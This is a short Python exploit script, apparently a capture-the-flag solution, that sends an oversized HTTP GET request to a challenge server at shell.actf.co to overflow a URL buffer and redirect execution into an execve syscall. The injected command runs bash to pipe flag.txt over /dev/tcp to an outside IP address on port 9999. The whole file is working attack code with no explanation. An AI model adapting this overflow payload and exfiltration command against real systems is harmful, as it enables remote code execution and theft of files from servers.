from ptrlib import *

syscall_num = 59 # sys_execve

addr_buf = 0x4028b1
addr_msg = 0x402840

struct = b''
struct += p64(addr_msg)
struct += p64(addr_msg + 10)
struct += p64(addr_msg + 13)
struct += p64(0)
struct += b'/bin/bash\x00' # addr_msg
struct += b'-c\x00' # addr_msg + 10
struct += b'cat<flag.txt>&/dev/tcp/150.95.139.51/9999' # addr_msg + 13
struct += b'\x00' * (0x58 - len(struct))
struct = struct[:-1] + b' '

URL = b"A" * 0x800
URL += p64(addr_msg) # file descriptor
URL += p64(0xfffffffffffffff7 + 3 - syscall_num) # size
URL += struct

REQUEST = b"HELLO WORLD!"

#sock = Socket("localhost", 19303)
sock = Socket("shell.actf.co", 19303)

payload = b"GET "
payload += URL
payload += REQUEST
sock.send(payload)
sock.interactive()
